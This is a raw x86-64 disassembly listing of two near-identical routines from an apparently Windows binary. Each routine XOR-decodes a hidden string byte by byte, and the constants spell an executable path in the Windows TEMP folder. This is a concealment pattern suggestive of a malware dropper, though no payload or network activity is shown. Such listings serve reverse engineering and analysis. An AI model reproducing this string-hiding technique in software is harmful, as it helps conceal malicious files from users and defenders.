   1400032ba:	4c 8d 0d 1f b6 00 00 	lea    0xb61f(%rip),%r9        # 0x14000e8e0
   1400032c1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400032c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400032cf:	00 
   1400032d0:	48 ff c1             	inc    %rcx
   1400032d3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   1400032d8:	75 f6                	jne    0x1400032d0
   1400032da:	48 83 3d 8e d2 01 00 	cmpq   $0xf,0x1d28e(%rip)        # 0x140020570
   1400032e1:	0f 
   1400032e2:	48 8b c3             	mov    %rbx,%rax
   1400032e5:	4c 8b c3             	mov    %rbx,%r8
   1400032e8:	48 0f 47 05 68 d2 01 	cmova  0x1d268(%rip),%rax        # 0x140020558
   1400032ef:	00 
   1400032f0:	c6 00 2c             	movb   $0x2c,(%rax)
   1400032f3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400032f8:	48 83 3d 70 d2 01 00 	cmpq   $0xf,0x1d270(%rip)        # 0x140020570
   1400032ff:	0f 
   140003300:	4c 0f 47 05 50 d2 01 	cmova  0x1d250(%rip),%r8        # 0x140020558
   140003307:	00 
   140003308:	33 d2                	xor    %edx,%edx
   14000330a:	48 f7 f1             	div    %rcx
   14000330d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003312:	34 3a                	xor    $0x3a,%al
   140003314:	41 88 40 01          	mov    %al,0x1(%r8)
   140003318:	4c 8b c3             	mov    %rbx,%r8
   14000331b:	48 83 3d 4d d2 01 00 	cmpq   $0xf,0x1d24d(%rip)        # 0x140020570
   140003322:	0f 
   140003323:	b8 02 00 00 00       	mov    $0x2,%eax
   140003328:	4c 0f 47 05 28 d2 01 	cmova  0x1d228(%rip),%r8        # 0x140020558
   14000332f:	00 
   140003330:	33 d2                	xor    %edx,%edx
   140003332:	48 f7 f1             	div    %rcx
   140003335:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000333a:	34 5c                	xor    $0x5c,%al
   14000333c:	41 88 40 02          	mov    %al,0x2(%r8)
   140003340:	4c 8b c3             	mov    %rbx,%r8
   140003343:	48 83 3d 25 d2 01 00 	cmpq   $0xf,0x1d225(%rip)        # 0x140020570
   14000334a:	0f 
   14000334b:	b8 03 00 00 00       	mov    $0x3,%eax
   140003350:	4c 0f 47 05 00 d2 01 	cmova  0x1d200(%rip),%r8        # 0x140020558
   140003357:	00 
   140003358:	33 d2                	xor    %edx,%edx
   14000335a:	48 f7 f1             	div    %rcx
   14000335d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003362:	34 57                	xor    $0x57,%al
   140003364:	41 88 40 03          	mov    %al,0x3(%r8)
   140003368:	4c 8b c3             	mov    %rbx,%r8
   14000336b:	48 83 3d fd d1 01 00 	cmpq   $0xf,0x1d1fd(%rip)        # 0x140020570
   140003372:	0f 
   140003373:	b8 04 00 00 00       	mov    $0x4,%eax
   140003378:	4c 0f 47 05 d8 d1 01 	cmova  0x1d1d8(%rip),%r8        # 0x140020558
   14000337f:	00 
   140003380:	33 d2                	xor    %edx,%edx
   140003382:	48 f7 f1             	div    %rcx
   140003385:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000338a:	34 69                	xor    $0x69,%al
   14000338c:	41 88 40 04          	mov    %al,0x4(%r8)
   140003390:	4c 8b c3             	mov    %rbx,%r8
   140003393:	48 83 3d d5 d1 01 00 	cmpq   $0xf,0x1d1d5(%rip)        # 0x140020570
   14000339a:	0f 
   14000339b:	b8 05 00 00 00       	mov    $0x5,%eax
   1400033a0:	4c 0f 47 05 b0 d1 01 	cmova  0x1d1b0(%rip),%r8        # 0x140020558
   1400033a7:	00 
   1400033a8:	33 d2                	xor    %edx,%edx
   1400033aa:	48 f7 f1             	div    %rcx
   1400033ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400033b2:	34 6e                	xor    $0x6e,%al
   1400033b4:	41 88 40 05          	mov    %al,0x5(%r8)
   1400033b8:	4c 8b c3             	mov    %rbx,%r8
   1400033bb:	48 83 3d ad d1 01 00 	cmpq   $0xf,0x1d1ad(%rip)        # 0x140020570
   1400033c2:	0f 
   1400033c3:	b8 06 00 00 00       	mov    $0x6,%eax
   1400033c8:	4c 0f 47 05 88 d1 01 	cmova  0x1d188(%rip),%r8        # 0x140020558
   1400033cf:	00 
   1400033d0:	33 d2                	xor    %edx,%edx
   1400033d2:	48 f7 f1             	div    %rcx
   1400033d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400033da:	34 64                	xor    $0x64,%al
   1400033dc:	41 88 40 06          	mov    %al,0x6(%r8)
   1400033e0:	4c 8b c3             	mov    %rbx,%r8
   1400033e3:	48 83 3d 85 d1 01 00 	cmpq   $0xf,0x1d185(%rip)        # 0x140020570
   1400033ea:	0f 
   1400033eb:	b8 07 00 00 00       	mov    $0x7,%eax
   1400033f0:	4c 0f 47 05 60 d1 01 	cmova  0x1d160(%rip),%r8        # 0x140020558
   1400033f7:	00 
   1400033f8:	33 d2                	xor    %edx,%edx
   1400033fa:	48 f7 f1             	div    %rcx
   1400033fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003402:	34 6f                	xor    $0x6f,%al
   140003404:	41 88 40 07          	mov    %al,0x7(%r8)
   140003408:	4c 8b c3             	mov    %rbx,%r8
   14000340b:	48 83 3d 5d d1 01 00 	cmpq   $0xf,0x1d15d(%rip)        # 0x140020570
   140003412:	0f 
   140003413:	b8 08 00 00 00       	mov    $0x8,%eax
   140003418:	4c 0f 47 05 38 d1 01 	cmova  0x1d138(%rip),%r8        # 0x140020558
   14000341f:	00 
   140003420:	33 d2                	xor    %edx,%edx
   140003422:	48 f7 f1             	div    %rcx
   140003425:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000342a:	34 77                	xor    $0x77,%al
   14000342c:	41 88 40 08          	mov    %al,0x8(%r8)
   140003430:	4c 8b c3             	mov    %rbx,%r8
   140003433:	48 83 3d 35 d1 01 00 	cmpq   $0xf,0x1d135(%rip)        # 0x140020570
   14000343a:	0f 
   14000343b:	b8 09 00 00 00       	mov    $0x9,%eax
   140003440:	4c 0f 47 05 10 d1 01 	cmova  0x1d110(%rip),%r8        # 0x140020558
   140003447:	00 
   140003448:	33 d2                	xor    %edx,%edx
   14000344a:	48 f7 f1             	div    %rcx
   14000344d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003452:	34 73                	xor    $0x73,%al
   140003454:	41 88 40 09          	mov    %al,0x9(%r8)
   140003458:	4c 8b c3             	mov    %rbx,%r8
   14000345b:	48 83 3d 0d d1 01 00 	cmpq   $0xf,0x1d10d(%rip)        # 0x140020570
   140003462:	0f 
   140003463:	b8 0a 00 00 00       	mov    $0xa,%eax
   140003468:	4c 0f 47 05 e8 d0 01 	cmova  0x1d0e8(%rip),%r8        # 0x140020558
   14000346f:	00 
   140003470:	33 d2                	xor    %edx,%edx
   140003472:	48 f7 f1             	div    %rcx
   140003475:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000347a:	34 5c                	xor    $0x5c,%al
   14000347c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140003480:	4c 8b c3             	mov    %rbx,%r8
   140003483:	48 83 3d e5 d0 01 00 	cmpq   $0xf,0x1d0e5(%rip)        # 0x140020570
   14000348a:	0f 
   14000348b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140003490:	4c 0f 47 05 c0 d0 01 	cmova  0x1d0c0(%rip),%r8        # 0x140020558
   140003497:	00 
   140003498:	33 d2                	xor    %edx,%edx
   14000349a:	48 f7 f1             	div    %rcx
   14000349d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400034a2:	34 54                	xor    $0x54,%al
   1400034a4:	41 88 40 0b          	mov    %al,0xb(%r8)
   1400034a8:	4c 8b c3             	mov    %rbx,%r8
   1400034ab:	48 83 3d bd d0 01 00 	cmpq   $0xf,0x1d0bd(%rip)        # 0x140020570
   1400034b2:	0f 
   1400034b3:	b8 0c 00 00 00       	mov    $0xc,%eax
   1400034b8:	4c 0f 47 05 98 d0 01 	cmova  0x1d098(%rip),%r8        # 0x140020558
   1400034bf:	00 
   1400034c0:	33 d2                	xor    %edx,%edx
   1400034c2:	48 f7 f1             	div    %rcx
   1400034c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400034ca:	34 45                	xor    $0x45,%al
   1400034cc:	41 88 40 0c          	mov    %al,0xc(%r8)
   1400034d0:	4c 8b c3             	mov    %rbx,%r8
   1400034d3:	48 83 3d 95 d0 01 00 	cmpq   $0xf,0x1d095(%rip)        # 0x140020570
   1400034da:	0f 
   1400034db:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400034e0:	4c 0f 47 05 70 d0 01 	cmova  0x1d070(%rip),%r8        # 0x140020558
   1400034e7:	00 
   1400034e8:	33 d2                	xor    %edx,%edx
   1400034ea:	48 f7 f1             	div    %rcx
   1400034ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400034f2:	34 4d                	xor    $0x4d,%al
   1400034f4:	41 88 40 0d          	mov    %al,0xd(%r8)
   1400034f8:	4c 8b c3             	mov    %rbx,%r8
   1400034fb:	48 83 3d 6d d0 01 00 	cmpq   $0xf,0x1d06d(%rip)        # 0x140020570
   140003502:	0f 
   140003503:	b8 0e 00 00 00       	mov    $0xe,%eax
   140003508:	4c 0f 47 05 48 d0 01 	cmova  0x1d048(%rip),%r8        # 0x140020558
   14000350f:	00 
   140003510:	33 d2                	xor    %edx,%edx
   140003512:	48 f7 f1             	div    %rcx
   140003515:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000351a:	34 50                	xor    $0x50,%al
   14000351c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140003520:	4c 8b c3             	mov    %rbx,%r8
   140003523:	48 83 3d 45 d0 01 00 	cmpq   $0xf,0x1d045(%rip)        # 0x140020570
   14000352a:	0f 
   14000352b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140003530:	4c 0f 47 05 20 d0 01 	cmova  0x1d020(%rip),%r8        # 0x140020558
   140003537:	00 
   140003538:	33 d2                	xor    %edx,%edx
   14000353a:	48 f7 f1             	div    %rcx
   14000353d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003542:	34 5c                	xor    $0x5c,%al
   140003544:	41 88 40 0f          	mov    %al,0xf(%r8)
   140003548:	4c 8b c3             	mov    %rbx,%r8
   14000354b:	48 83 3d 1d d0 01 00 	cmpq   $0xf,0x1d01d(%rip)        # 0x140020570
   140003552:	0f 
   140003553:	b8 10 00 00 00       	mov    $0x10,%eax
   140003558:	4c 0f 47 05 f8 cf 01 	cmova  0x1cff8(%rip),%r8        # 0x140020558
   14000355f:	00 
   140003560:	33 d2                	xor    %edx,%edx
   140003562:	48 f7 f1             	div    %rcx
   140003565:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000356a:	34 67                	xor    $0x67,%al
   14000356c:	41 88 40 10          	mov    %al,0x10(%r8)
   140003570:	4c 8b c3             	mov    %rbx,%r8
   140003573:	48 83 3d f5 cf 01 00 	cmpq   $0xf,0x1cff5(%rip)        # 0x140020570
   14000357a:	0f 
   14000357b:	b8 11 00 00 00       	mov    $0x11,%eax
   140003580:	4c 0f 47 05 d0 cf 01 	cmova  0x1cfd0(%rip),%r8        # 0x140020558
   140003587:	00 
   140003588:	33 d2                	xor    %edx,%edx
   14000358a:	48 f7 f1             	div    %rcx
   14000358d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003592:	34 69                	xor    $0x69,%al
   140003594:	41 88 40 11          	mov    %al,0x11(%r8)
   140003598:	4c 8b c3             	mov    %rbx,%r8
   14000359b:	48 83 3d cd cf 01 00 	cmpq   $0xf,0x1cfcd(%rip)        # 0x140020570
   1400035a2:	0f 
   1400035a3:	b8 12 00 00 00       	mov    $0x12,%eax
   1400035a8:	4c 0f 47 05 a8 cf 01 	cmova  0x1cfa8(%rip),%r8        # 0x140020558
   1400035af:	00 
   1400035b0:	33 d2                	xor    %edx,%edx
   1400035b2:	48 f7 f1             	div    %rcx
   1400035b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400035ba:	34 61                	xor    $0x61,%al
   1400035bc:	41 88 40 12          	mov    %al,0x12(%r8)
   1400035c0:	4c 8b c3             	mov    %rbx,%r8
   1400035c3:	48 83 3d a5 cf 01 00 	cmpq   $0xf,0x1cfa5(%rip)        # 0x140020570
   1400035ca:	0f 
   1400035cb:	b8 13 00 00 00       	mov    $0x13,%eax
   1400035d0:	4c 0f 47 05 80 cf 01 	cmova  0x1cf80(%rip),%r8        # 0x140020558
   1400035d7:	00 
   1400035d8:	33 d2                	xor    %edx,%edx
   1400035da:	48 f7 f1             	div    %rcx
   1400035dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400035e2:	34 6e                	xor    $0x6e,%al
   1400035e4:	41 88 40 13          	mov    %al,0x13(%r8)
   1400035e8:	4c 8b c3             	mov    %rbx,%r8
   1400035eb:	48 83 3d 7d cf 01 00 	cmpq   $0xf,0x1cf7d(%rip)        # 0x140020570
   1400035f2:	0f 
   1400035f3:	b8 14 00 00 00       	mov    $0x14,%eax
   1400035f8:	4c 0f 47 05 58 cf 01 	cmova  0x1cf58(%rip),%r8        # 0x140020558
   1400035ff:	00 
   140003600:	33 d2                	xor    %edx,%edx
   140003602:	48 f7 f1             	div    %rcx
   140003605:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000360a:	34 6e                	xor    $0x6e,%al
   14000360c:	41 88 40 14          	mov    %al,0x14(%r8)
   140003610:	4c 8b c3             	mov    %rbx,%r8
   140003613:	48 83 3d 55 cf 01 00 	cmpq   $0xf,0x1cf55(%rip)        # 0x140020570
   14000361a:	0f 
   14000361b:	b8 15 00 00 00       	mov    $0x15,%eax
   140003620:	4c 0f 47 05 30 cf 01 	cmova  0x1cf30(%rip),%r8        # 0x140020558
   140003627:	00 
   140003628:	33 d2                	xor    %edx,%edx
   14000362a:	48 f7 f1             	div    %rcx
   14000362d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003632:	34 69                	xor    $0x69,%al
   140003634:	41 88 40 15          	mov    %al,0x15(%r8)
   140003638:	4c 8b c3             	mov    %rbx,%r8
   14000363b:	48 83 3d 2d cf 01 00 	cmpq   $0xf,0x1cf2d(%rip)        # 0x140020570
   140003642:	0f 
   140003643:	b8 16 00 00 00       	mov    $0x16,%eax
   140003648:	4c 0f 47 05 08 cf 01 	cmova  0x1cf08(%rip),%r8        # 0x140020558
   14000364f:	00 
   140003650:	33 d2                	xor    %edx,%edx
   140003652:	48 f7 f1             	div    %rcx
   140003655:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000365a:	34 36                	xor    $0x36,%al
   14000365c:	41 88 40 16          	mov    %al,0x16(%r8)
   140003660:	4c 8b c3             	mov    %rbx,%r8
   140003663:	48 83 3d 05 cf 01 00 	cmpq   $0xf,0x1cf05(%rip)        # 0x140020570
   14000366a:	0f 
   14000366b:	b8 17 00 00 00       	mov    $0x17,%eax
   140003670:	4c 0f 47 05 e0 ce 01 	cmova  0x1cee0(%rip),%r8        # 0x140020558
   140003677:	00 
   140003678:	33 d2                	xor    %edx,%edx
   14000367a:	48 f7 f1             	div    %rcx
   14000367d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003682:	34 2e                	xor    $0x2e,%al
   140003684:	41 88 40 17          	mov    %al,0x17(%r8)
   140003688:	4c 8b c3             	mov    %rbx,%r8
   14000368b:	48 83 3d dd ce 01 00 	cmpq   $0xf,0x1cedd(%rip)        # 0x140020570
   140003692:	0f 
   140003693:	b8 18 00 00 00       	mov    $0x18,%eax
   140003698:	4c 0f 47 05 b8 ce 01 	cmova  0x1ceb8(%rip),%r8        # 0x140020558
   14000369f:	00 
   1400036a0:	33 d2                	xor    %edx,%edx
   1400036a2:	48 f7 f1             	div    %rcx
   1400036a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400036aa:	34 65                	xor    $0x65,%al
   1400036ac:	41 88 40 18          	mov    %al,0x18(%r8)
   1400036b0:	4c 8b c3             	mov    %rbx,%r8
   1400036b3:	48 83 3d b5 ce 01 00 	cmpq   $0xf,0x1ceb5(%rip)        # 0x140020570
   1400036ba:	0f 
   1400036bb:	b8 19 00 00 00       	mov    $0x19,%eax
   1400036c0:	4c 0f 47 05 90 ce 01 	cmova  0x1ce90(%rip),%r8        # 0x140020558
   1400036c7:	00 
   1400036c8:	33 d2                	xor    %edx,%edx
   1400036ca:	48 f7 f1             	div    %rcx
   1400036cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400036d2:	34 78                	xor    $0x78,%al
   1400036d4:	41 88 40 19          	mov    %al,0x19(%r8)
   1400036d8:	4c 8b c3             	mov    %rbx,%r8
   1400036db:	48 83 3d 8d ce 01 00 	cmpq   $0xf,0x1ce8d(%rip)        # 0x140020570
   1400036e2:	0f 
   1400036e3:	b8 1a 00 00 00       	mov    $0x1a,%eax
   1400036e8:	4c 0f 47 05 68 ce 01 	cmova  0x1ce68(%rip),%r8        # 0x140020558
   1400036ef:	00 
   1400036f0:	33 d2                	xor    %edx,%edx
   1400036f2:	48 f7 f1             	div    %rcx
   1400036f5:	48 8b c3             	mov    %rbx,%rax
   1400036f8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400036fd:	80 f1 65             	xor    $0x65,%cl
   140003700:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003704:	48 83 c4 30          	add    $0x30,%rsp
   140003708:	5b                   	pop    %rbx
   140003709:	c3                   	ret
   14000370a:	cc                   	int3
   14000370b:	cc                   	int3
   14000370c:	cc                   	int3
   14000370d:	cc                   	int3
   14000370e:	cc                   	int3
   14000370f:	cc                   	int3
   140003710:	40 53                	rex push %rbx
   140003712:	48 83 ec 30          	sub    $0x30,%rsp
   140003716:	48 8d 1d 5b cd 01 00 	lea    0x1cd5b(%rip),%rbx        # 0x140020478
   14000371d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140003722:	48 8b cb             	mov    %rbx,%rcx
   140003725:	e8 36 2d 00 00       	call   0x140006460
   14000372a:	4c 8d 0d af b1 00 00 	lea    0xb1af(%rip),%r9        # 0x14000e8e0
   140003731:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000373f:	00 
   140003740:	48 ff c1             	inc    %rcx
   140003743:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140003748:	75 f6                	jne    0x140003740
   14000374a:	48 83 3d 3e cd 01 00 	cmpq   $0xf,0x1cd3e(%rip)        # 0x140020490
   140003751:	0f 
   140003752:	48 8b c3             	mov    %rbx,%rax
   140003755:	4c 8b c3             	mov    %rbx,%r8
   140003758:	48 0f 47 05 18 cd 01 	cmova  0x1cd18(%rip),%rax        # 0x140020478
   14000375f:	00 
   140003760:	c6 00 2c             	movb   $0x2c,(%rax)
   140003763:	b8 01 00 00 00       	mov    $0x1,%eax
   140003768:	48 83 3d 20 cd 01 00 	cmpq   $0xf,0x1cd20(%rip)        # 0x140020490
   14000376f:	0f 
   140003770:	4c 0f 47 05 00 cd 01 	cmova  0x1cd00(%rip),%r8        # 0x140020478
   140003777:	00 
   140003778:	33 d2                	xor    %edx,%edx
   14000377a:	48 f7 f1             	div    %rcx
   14000377d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003782:	34 3a                	xor    $0x3a,%al
   140003784:	41 88 40 01          	mov    %al,0x1(%r8)
   140003788:	4c 8b c3             	mov    %rbx,%r8
   14000378b:	48 83 3d fd cc 01 00 	cmpq   $0xf,0x1ccfd(%rip)        # 0x140020490
   140003792:	0f 
   140003793:	b8 02 00 00 00       	mov    $0x2,%eax
   140003798:	4c 0f 47 05 d8 cc 01 	cmova  0x1ccd8(%rip),%r8        # 0x140020478
   14000379f:	00 
   1400037a0:	33 d2                	xor    %edx,%edx
   1400037a2:	48 f7 f1             	div    %rcx
   1400037a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400037aa:	34 5c                	xor    $0x5c,%al
   1400037ac:	41 88 40 02          	mov    %al,0x2(%r8)
   1400037b0:	4c 8b c3             	mov    %rbx,%r8
   1400037b3:	48 83 3d d5 cc 01 00 	cmpq   $0xf,0x1ccd5(%rip)        # 0x140020490
   1400037ba:	0f 
   1400037bb:	b8 03 00 00 00       	mov    $0x3,%eax
   1400037c0:	4c 0f 47 05 b0 cc 01 	cmova  0x1ccb0(%rip),%r8        # 0x140020478
   1400037c7:	00 
   1400037c8:	33 d2                	xor    %edx,%edx
   1400037ca:	48 f7 f1             	div    %rcx
   1400037cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400037d2:	34 57                	xor    $0x57,%al
   1400037d4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400037d8:	4c 8b c3             	mov    %rbx,%r8
   1400037db:	48 83 3d ad cc 01 00 	cmpq   $0xf,0x1ccad(%rip)        # 0x140020490
   1400037e2:	0f 
   1400037e3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400037e8:	4c 0f 47 05 88 cc 01 	cmova  0x1cc88(%rip),%r8        # 0x140020478
   1400037ef:	00 
   1400037f0:	33 d2                	xor    %edx,%edx
   1400037f2:	48 f7 f1             	div    %rcx
   1400037f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400037fa:	34 69                	xor    $0x69,%al
   1400037fc:	41 88 40 04          	mov    %al,0x4(%r8)
   140003800:	4c 8b c3             	mov    %rbx,%r8
   140003803:	48 83 3d 85 cc 01 00 	cmpq   $0xf,0x1cc85(%rip)        # 0x140020490
   14000380a:	0f 
   14000380b:	b8 05 00 00 00       	mov    $0x5,%eax
   140003810:	4c 0f 47 05 60 cc 01 	cmova  0x1cc60(%rip),%r8        # 0x140020478
   140003817:	00 
   140003818:	33 d2                	xor    %edx,%edx
   14000381a:	48 f7 f1             	div    %rcx
   14000381d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003822:	34 6e                	xor    $0x6e,%al
   140003824:	41 88 40 05          	mov    %al,0x5(%r8)
   140003828:	4c 8b c3             	mov    %rbx,%r8
   14000382b:	48 83 3d 5d cc 01 00 	cmpq   $0xf,0x1cc5d(%rip)        # 0x140020490
   140003832:	0f 
   140003833:	b8 06 00 00 00       	mov    $0x6,%eax
   140003838:	4c 0f 47 05 38 cc 01 	cmova  0x1cc38(%rip),%r8        # 0x140020478
   14000383f:	00 
   140003840:	33 d2                	xor    %edx,%edx
   140003842:	48 f7 f1             	div    %rcx
   140003845:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000384a:	34 64                	xor    $0x64,%al
   14000384c:	41 88 40 06          	mov    %al,0x6(%r8)
   140003850:	4c 8b c3             	mov    %rbx,%r8
   140003853:	48 83 3d 35 cc 01 00 	cmpq   $0xf,0x1cc35(%rip)        # 0x140020490
   14000385a:	0f 
   14000385b:	b8 07 00 00 00       	mov    $0x7,%eax
   140003860:	4c 0f 47 05 10 cc 01 	cmova  0x1cc10(%rip),%r8        # 0x140020478
   140003867:	00 
   140003868:	33 d2                	xor    %edx,%edx
   14000386a:	48 f7 f1             	div    %rcx
   14000386d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003872:	34 6f                	xor    $0x6f,%al
   140003874:	41 88 40 07          	mov    %al,0x7(%r8)
   140003878:	4c 8b c3             	mov    %rbx,%r8
   14000387b:	48 83 3d 0d cc 01 00 	cmpq   $0xf,0x1cc0d(%rip)        # 0x140020490
   140003882:	0f 
   140003883:	b8 08 00 00 00       	mov    $0x8,%eax
   140003888:	4c 0f 47 05 e8 cb 01 	cmova  0x1cbe8(%rip),%r8        # 0x140020478
   14000388f:	00 
   140003890:	33 d2                	xor    %edx,%edx
   140003892:	48 f7 f1             	div    %rcx
   140003895:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000389a:	34 77                	xor    $0x77,%al
   14000389c:	41 88 40 08          	mov    %al,0x8(%r8)
   1400038a0:	4c 8b c3             	mov    %rbx,%r8
   1400038a3:	48 83 3d e5 cb 01 00 	cmpq   $0xf,0x1cbe5(%rip)        # 0x140020490
   1400038aa:	0f 
   1400038ab:	b8 09 00 00 00       	mov    $0x9,%eax
   1400038b0:	4c 0f 47 05 c0 cb 01 	cmova  0x1cbc0(%rip),%r8        # 0x140020478
   1400038b7:	00 
   1400038b8:	33 d2                	xor    %edx,%edx
   1400038ba:	48 f7 f1             	div    %rcx
   1400038bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400038c2:	34 73                	xor    $0x73,%al
   1400038c4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400038c8:	4c 8b c3             	mov    %rbx,%r8
   1400038cb:	48 83 3d bd cb 01 00 	cmpq   $0xf,0x1cbbd(%rip)        # 0x140020490
   1400038d2:	0f 
   1400038d3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400038d8:	4c 0f 47 05 98 cb 01 	cmova  0x1cb98(%rip),%r8        # 0x140020478
   1400038df:	00 
   1400038e0:	33 d2                	xor    %edx,%edx
   1400038e2:	48 f7 f1             	div    %rcx
   1400038e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400038ea:	34 5c                	xor    $0x5c,%al
   1400038ec:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400038f0:	4c 8b c3             	mov    %rbx,%r8
   1400038f3:	48 83 3d 95 cb 01 00 	cmpq   $0xf,0x1cb95(%rip)        # 0x140020490
   1400038fa:	0f 
   1400038fb:	b8 0b 00 00 00       	mov    $0xb,%eax
   140003900:	4c 0f 47 05 70 cb 01 	cmova  0x1cb70(%rip),%r8        # 0x140020478
   140003907:	00 
   140003908:	33 d2                	xor    %edx,%edx
   14000390a:	48 f7 f1             	div    %rcx
   14000390d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003912:	34 54                	xor    $0x54,%al
   140003914:	41 88 40 0b          	mov    %al,0xb(%r8)
   140003918:	4c 8b c3             	mov    %rbx,%r8
   14000391b:	48 83 3d 6d cb 01 00 	cmpq   $0xf,0x1cb6d(%rip)        # 0x140020490
   140003922:	0f 
   140003923:	b8 0c 00 00 00       	mov    $0xc,%eax
   140003928:	4c 0f 47 05 48 cb 01 	cmova  0x1cb48(%rip),%r8        # 0x140020478
   14000392f:	00 
   140003930:	33 d2                	xor    %edx,%edx
   140003932:	48 f7 f1             	div    %rcx
   140003935:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000393a:	34 45                	xor    $0x45,%al
   14000393c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140003940:	4c 8b c3             	mov    %rbx,%r8
   140003943:	48 83 3d 45 cb 01 00 	cmpq   $0xf,0x1cb45(%rip)        # 0x140020490
   14000394a:	0f 
   14000394b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140003950:	4c 0f 47 05 20 cb 01 	cmova  0x1cb20(%rip),%r8        # 0x140020478
   140003957:	00 
   140003958:	33 d2                	xor    %edx,%edx
   14000395a:	48 f7 f1             	div    %rcx
   14000395d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003962:	34 4d                	xor    $0x4d,%al
   140003964:	41 88 40 0d          	mov    %al,0xd(%r8)
   140003968:	4c 8b c3             	mov    %rbx,%r8
   14000396b:	48 83 3d 1d cb 01 00 	cmpq   $0xf,0x1cb1d(%rip)        # 0x140020490
   140003972:	0f 
   140003973:	b8 0e 00 00 00       	mov    $0xe,%eax
   140003978:	4c 0f 47 05 f8 ca 01 	cmova  0x1caf8(%rip),%r8        # 0x140020478
   14000397f:	00 
   140003980:	33 d2                	xor    %edx,%edx
   140003982:	48 f7 f1             	div    %rcx
   140003985:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000398a:	34 50                	xor    $0x50,%al
   14000398c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140003990:	4c 8b c3             	mov    %rbx,%r8
   140003993:	48 83 3d f5 ca 01 00 	cmpq   $0xf,0x1caf5(%rip)        # 0x140020490
   14000399a:	0f 
   14000399b:	b8 0f 00 00 00       	mov    $0xf,%eax
   1400039a0:	4c 0f 47 05 d0 ca 01 	cmova  0x1cad0(%rip),%r8        # 0x140020478
   1400039a7:	00 
   1400039a8:	33 d2                	xor    %edx,%edx
   1400039aa:	48 f7 f1             	div    %rcx
   1400039ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400039b2:	34 5c                	xor    $0x5c,%al
   1400039b4:	41 88 40 0f          	mov    %al,0xf(%r8)
   1400039b8:	4c 8b c3             	mov    %rbx,%r8
   1400039bb:	48 83 3d cd ca 01 00 	cmpq   $0xf,0x1cacd(%rip)        # 0x140020490
   1400039c2:	0f 
   1400039c3:	b8 10 00 00 00       	mov    $0x10,%eax
   1400039c8:	4c 0f 47 05 a8 ca 01 	cmova  0x1caa8(%rip),%r8        # 0x140020478
   1400039cf:	00 
   1400039d0:	33 d2                	xor    %edx,%edx
   1400039d2:	48 f7 f1             	div    %rcx
   1400039d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400039da:	34 67                	xor    $0x67,%al
